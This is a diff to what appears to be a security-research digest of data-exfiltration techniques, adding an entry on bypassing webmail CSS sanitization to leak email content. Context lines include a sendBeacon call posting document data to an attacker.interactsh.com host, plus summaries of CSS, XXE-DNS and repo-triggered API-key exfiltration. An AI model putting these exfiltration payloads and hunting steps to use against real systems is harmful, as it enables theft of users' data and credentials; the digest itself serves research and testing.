@@ -178,3 +178,16 @@ navigator.sendBeacon('https://attacker.interactsh.com/', JSON.stringify({c:docum
 - **Inline style exfiltration** · CSS injection in `style` attributes (no `<style>` tag needed) leaks data char-by-char via background-image load — bypasses CSP policies that block `<style>` but allow inline styles · https://portswigger.net/research/inline-style-exfiltration
 - **Claude Code API key exfil (CVE-2026-21852)** · Project-load triggers `.claude/settings.json` read; attacker embeds exfil payload in repo that fires on open, sends API keys to OOB server
 - **DNS exfil via XXE** · Widely used in appliance testing where HTTP OOB is firewalled; DNS always works; encode data as hex/base32 in subdomain labels, reconstruct from DNS logs
+
+## 2026-08-30
+
+### CSS exfiltration via webmail CSS sanitization bypass
+- **Tags:** `#data-exfil` `#web`
+- **Severity:** medium · **Hunt:** 3/5 · **Score:** 22.5 · **Status:** poc · **Age:** 0d
+- **Sources:** [1](https://portswigger.net/research/css-the-bomb-inside-your-inbox) · [2](https://medium.com/@mcmullinalexius/the-soc-that-saw-nothing-32dd927988c5)
+
+**CSS exfiltration via webmail CSS sanitization bypass** — Webmail clients render untrusted CSS inside their trusted UI and rely on sanitization to make it safe; bypassing that sanitization enables silent exfiltration of email content and user data. Hunt: inject CSS payloads (attribute selectors, `@import`, `@font-face` callbacks) into email bodies targeting webmail clients and check whether sanitization strips them or lets them fire. [src](https://portswigger.net/research/css-the-bomb-inside-your-inbox)
+
+---
+*Clustered 2 sources for this item.*
+
